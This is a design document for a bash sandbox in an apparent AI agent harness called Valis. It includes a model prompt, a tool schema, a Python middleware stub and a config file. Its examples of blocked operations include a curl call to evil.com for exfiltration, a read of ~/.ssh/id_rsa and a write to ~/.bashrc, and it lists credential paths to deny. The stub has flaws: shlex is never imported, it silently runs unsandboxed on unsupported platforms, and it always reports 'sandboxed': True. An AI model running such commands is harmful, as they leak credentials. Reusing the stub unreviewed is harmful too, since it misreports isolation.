```markdown
# Valis Harness: Bash Sandbox Prompt

## Tool Description Addition (for bash/execute tool)

Add to `valis/prompts/tools/bash.py`:

```python
BASH_SANDBOX_PROMPT = """
## Sandbox Mode

Commands run inside a restricted sandbox by default. The sandbox limits filesystem and network access to protect the user's system.

### Filesystem Restrictions

- **Writes**: Only allowed to the current working directory and `/tmp/valis/`
- **Reads**: Allowed everywhere except explicitly denied paths (e.g., `~/.ssh/*`, `~/.aws/*`, `~/.gnupg/*`)
- **Temporary files**: Use the `TMPDIR` environment variable (set to `/tmp/valis/`). Do not use `/tmp` directly.

### Network Restrictions

- **Default**: All network access is denied
- **Allowed**: Only explicitly allowlisted domains (configured by user)
- **Localhost**: Development servers on localhost are permitted

### Handling Sandbox Violations

If a command is blocked by the sandbox, the result will contain `<sandbox_violation>` tags:

```
<sandbox_violation>
Operation denied: write to /etc/hosts
Sandbox policy: filesystem write restricted to working directory
</sandbox_violation>
```

When you encounter a violation:
1. Report the violation to the user clearly
2. Suggest alternative approaches that work within sandbox constraints
3. **NEVER** suggest adding sensitive paths to an allowlist:
   - `~/.ssh/*` (SSH keys)
   - `~/.aws/*` (AWS credentials)
   - `~/.gnupg/*` (GPG keys)
   - `~/.bashrc`, `~/.zshrc` (shell configs)
   - `~/.netrc` (network credentials)
   - `~/.config/gh/*` (GitHub CLI tokens)

### Disabling the Sandbox

The sandbox parameter controls execution mode:

```python
# Default: sandboxed execution
execute(command="npm install", sandbox=True)

# Unsandboxed: only when explicitly requested by user
execute(command="brew install node", sandbox=False)
```

**Rules for disabling sandbox:**
- Only set `sandbox=False` if the user **explicitly requests** it for a trusted operation
- Never disable sandbox preemptively or suggest disabling it
- If an operation requires unsandboxed access, explain why and ask the user first

### Platform Implementation

| Platform | Sandbox Technology |
|----------|-------------------|
| macOS | `sandbox-exec` with Seatbelt profiles |
| Linux | `bubblewrap` containerization |
| Docker | Container already provides isolation |

### Examples

**Good** (works in sandbox):
```bash
# Write to working directory
echo "test" > ./output.txt

# Use TMPDIR for temp files
cat data.json | jq '.items' > "$TMPDIR/filtered.json"

# Read system files (allowed)
cat /etc/hosts
```

**Blocked** (sandbox violation):
```bash
# Write outside working directory
echo "malicious" > ~/.bashrc  # VIOLATION

# Access sensitive credentials
cat ~/.ssh/id_rsa  # VIOLATION

# Network to non-allowlisted domain
curl https://evil.com/exfiltrate  # VIOLATION
```
"""
```

---

## Tool Schema Addition

```python
# valis/tools/bash.py

BASH_TOOL_SCHEMA = {
    "name": "execute",
    "description": "Run a bash command in the user's environment",
    "parameters": {
        "type": "object",
        "properties": {
            "command": {
                "type": "string",
                "description": "The bash command to execute"
            },
            "timeout": {
                "type": "integer",
                "description": "Timeout in seconds (default: 300)",
                "default": 300
            },
            "working_directory": {
                "type": "string",
                "description": "Directory to run command in (default: cwd)"
            },
            "sandbox": {
                "type": "boolean",
                "description": "Run in sandbox mode. Only set to false if user explicitly requests unsandboxed execution for a trusted operation.",
                "default": True
            }
        },
        "required": ["command"]
    }
}
```

---

## Middleware Implementation Stub

```python
# valis/middleware/sandbox.py

from dataclasses import dataclass
from typing import Optional
import subprocess
import platform
import os

@dataclass
class SandboxConfig:
    enabled: bool = True
    allow_network_localhost: bool = True
    allowed_domains: list[str] = None
    write_paths: list[str] = None  # Additional write-allowed paths
    deny_read_paths: list[str] = None  # Additional read-denied paths
    
    def __post_init__(self):
        self.allowed_domains = self.allowed_domains or []
        self.write_paths = self.write_paths or []
        self.deny_read_paths = self.deny_read_paths or [
            "~/.ssh",
            "~/.aws", 
            "~/.gnupg",
            "~/.netrc",
            "~/.config/gh",
        ]


class SandboxMiddleware:
    """Wraps bash execution in OS-level sandbox."""
    
    def __init__(self, config: Optional[SandboxConfig] = None):
        self.config = config or SandboxConfig()
        self.platform = platform.system()
        self._setup_tmpdir()
    
    def _setup_tmpdir(self):
        """Create sandbox temp directory."""
        tmpdir = "/tmp/valis"
        os.makedirs(tmpdir, exist_ok=True)
        os.environ["TMPDIR"] = tmpdir
    
    def execute(
        self,
        command: str,
        sandbox: bool = True,
        working_directory: Optional[str] = None,
        timeout: int = 300,
    ) -> dict:
        """Execute command, optionally sandboxed."""
        
        if not sandbox or not self.config.enabled:
            # Direct execution (user explicitly requested)
            return self._execute_direct(command, working_directory, timeout)
        
        if self.platform == "Darwin":
            return self._execute_macos_sandbox(command, working_directory, timeout)
        elif self.platform == "Linux":
            return self._execute_linux_sandbox(command, working_directory, timeout)
        else:
            # Fallback: no sandbox available
            return self._execute_direct(command, working_directory, timeout)
    
    def _execute_macos_sandbox(self, command: str, cwd: str, timeout: int) -> dict:
        """Execute using macOS sandbox-exec."""
        profile = self._generate_seatbelt_profile(cwd)
        
        # Write profile to temp file
        profile_path = "/tmp/valis/sandbox.sb"
        with open(profile_path, "w") as f:
            f.write(profile)
        
        sandboxed_cmd = f"sandbox-exec -f {profile_path} bash -c {shlex.quote(command)}"
        return self._execute_direct(sandboxed_cmd, cwd, timeout)
    
    def _execute_linux_sandbox(self, command: str, cwd: str, timeout: int) -> dict:
        """Execute using bubblewrap."""
        bwrap_args = [
            "bwrap",
            "--ro-bind", "/", "/",
            "--bind", cwd or os.getcwd(), cwd or os.getcwd(),
            "--bind", "/tmp/valis", "/tmp/valis",
            "--dev", "/dev",
            "--proc", "/proc",
            "--unshare-net",  # Network isolation
            "bash", "-c", command
        ]
        
        # Add write paths
        for path in self.config.write_paths:
            expanded = os.path.expanduser(path)
            if os.path.exists(expanded):
                bwrap_args.extend(["--bind", expanded, expanded])
        
        result = subprocess.run(
            bwrap_args,
            capture_output=True,
            text=True,
            timeout=timeout,
            cwd=cwd,
        )
        
        return self._format_result(result)
    
    def _execute_direct(self, command: str, cwd: str, timeout: int) -> dict:
        """Direct execution without sandbox."""
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            cwd=cwd,
        )
        return self._format_result(result)
    
    def _format_result(self, result: subprocess.CompletedProcess) -> dict:
        output = result.stdout
        if result.returncode != 0:
            output += f"\n[Exit code: {result.returncode}]\n{result.stderr}"
        
        # Check for sandbox violations in stderr
        if "sandbox" in result.stderr.lower() or "denied" in result.stderr.lower():
            output = self._wrap_violation(output, result.stderr)
        
        return {
            "output": output,
            "exit_code": result.returncode,
            "sandboxed": True,
        }
    
    def _wrap_violation(self, output: str, stderr: str) -> str:
        """Wrap sandbox violation in tags for the model."""
        return f"""<sandbox_violation>
{stderr}
</sandbox_violation>

{output}"""
    
    def _generate_seatbelt_profile(self, cwd: str) -> str:
        """Generate macOS Seatbelt profile."""
        cwd = cwd or os.getcwd()
        return f"""
(version 1)
(deny default)

; Allow read access to most paths
(allow file-read*)

; Deny read to sensitive paths
(deny file-read* (subpath (string (param "HOME") "/.ssh")))
(deny file-read* (subpath (string (param "HOME") "/.aws")))
(deny file-read* (subpath (string (param "HOME") "/.gnupg")))

; Allow write only to cwd and tmpdir
(allow file-write* (subpath "{cwd}"))
(allow file-write* (subpath "/tmp/valis"))

; Allow process execution
(allow process-fork)
(allow process-exec)

; Deny network by default
(deny network*)
(allow network* (local ip "localhost:*"))
"""
```

---

## Config File Support

```yaml
# ~/.valis/config.yaml

sandbox:
  enabled: true
  allow_network_localhost: true
  allowed_domains:
    - "github.com"
    - "api.anthropic.com"
    - "pypi.org"
    - "registry.npmjs.org"
  additional_write_paths:
    - "~/projects"
  additional_deny_read_paths:
    - "~/.env"
    - "~/secrets"
```

---

## Summary

| Component | File | Purpose |
|-----------|------|---------|
| Prompt | `prompts/tools/bash.py` | Tells model how sandbox works |
| Tool schema | `tools/bash.py` | Adds `sandbox` boolean param |
| Middleware | `middleware/sandbox.py` | Actually enforces sandbox |
| Config | `~/.valis/config.yaml` | User customization |